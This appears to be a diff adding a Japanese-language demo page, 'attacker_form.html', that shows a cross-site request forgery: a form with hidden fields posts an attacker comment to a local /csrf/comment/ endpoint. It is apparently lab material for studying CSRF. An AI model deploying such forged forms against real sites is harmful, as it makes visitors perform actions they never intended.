@@ -1,0 +1,16 @@
+<!-- attacker_form.html (攻撃者が作成したページ) -->
+<!DOCTYPE html>
+<html lang="ja">
+  <head>
+    <meta charset="UTF-8" />
+    <title>攻撃者ページ</title>
+  </head>
+  <body>
+    <h1>悪意のあるページ</h1>
+    <form action="http://127.0.0.1:8000/csrf/comment/" method="POST">
+      <input type="hidden" name="user" value="attacker" />
+      <input type="hidden" name="content" value="攻撃者からのコメント" />
+      <input type="submit" value="コメント投稿" />
+    </form>
+  </body>
+</html>
